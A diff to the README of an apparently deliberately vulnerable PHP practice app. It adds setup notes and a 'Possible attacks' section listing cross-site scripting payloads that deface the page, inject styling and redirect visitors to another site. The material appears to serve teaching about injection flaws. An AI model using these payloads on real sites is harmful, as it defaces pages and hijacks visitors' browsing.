@@ -52,3 +52,25 @@ echo htmlentities($string, ENT_QUOTES, 'UTF-8');
 - There is a file called DB_CREATION.sql at Config folder.
 
 - Moddify the file ```db_connection.example.ini``` with the correct information to connect to your DataBase and rename the file to ```db_connection.ini```. (remember to take the '<' and '>' signs from the options!).
+
+## Possible attacks
+
+- Defacing the Page!
+```html
+<script>var image = document.getElementsByTagName('img');image[0].src = 'https://newscrewdriver.files.wordpress.com/2018/10/poptartcat320240.gif';var text = document.getElementsByTagName('p');text[1].innerHTML = 'Welcome to the internet world!!!';text = document.getElementsByTagName('h2');text[0].innerHTML = 'This is the future';</script>
+
+```
+```html
+<style>body{background: repeating-linear-gradient(
+  45deg,
+  #606dbc,
+  #606dbc 10px,
+  #465298 10px,
+  #465298 20px
+);}</style>
+```
+
+- Redirect to another page
+```html
+<script>window.location.href = "https://www.boringcompany.com/faq";</script>
+```
